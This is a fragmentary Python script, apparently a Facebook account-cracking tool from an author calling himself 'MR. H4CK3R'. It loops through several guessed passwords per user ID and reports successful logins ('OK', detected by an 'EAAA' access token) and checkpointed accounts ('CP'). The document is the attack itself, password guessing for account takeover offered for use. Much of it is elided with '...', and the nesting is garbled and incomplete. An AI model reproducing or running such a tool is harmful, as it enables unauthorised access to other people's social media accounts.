...
#AUTHOR : B1L4L (MR. H4CK3R)

#OPEN SOURCE :)

#CONTACT INFO :) NEKL BC
...
|_______/ |______/|________/|__/  |__/|________/ \______/ 
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[B1L4L0-OK😍] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[B1L4L0-CP🙁] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[B1L4L0-OK😍] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[B1L4LP-CP🙁] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[B1L4LO-OK😍] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[B1L4L0-CP🙁] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[B1L4L0-OK😍] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[B1L4LP-CP🙁] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[B1L4L0-OK😍] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[B1L4L0-CP🙁] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[B1L4LP-OK😍] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[B1L4L0-CP🙁] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[B1L4L0-OK😍] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[B1L4L0-CP🙁] "+uid+" | "+pass8+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[B1L4L0-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[B1L4L0-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[B1L4L0-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[B1L4L0-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[B1L4L0-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[B1L4L0-CP] "+uid+" | "+pass7+"\033[0;97m")
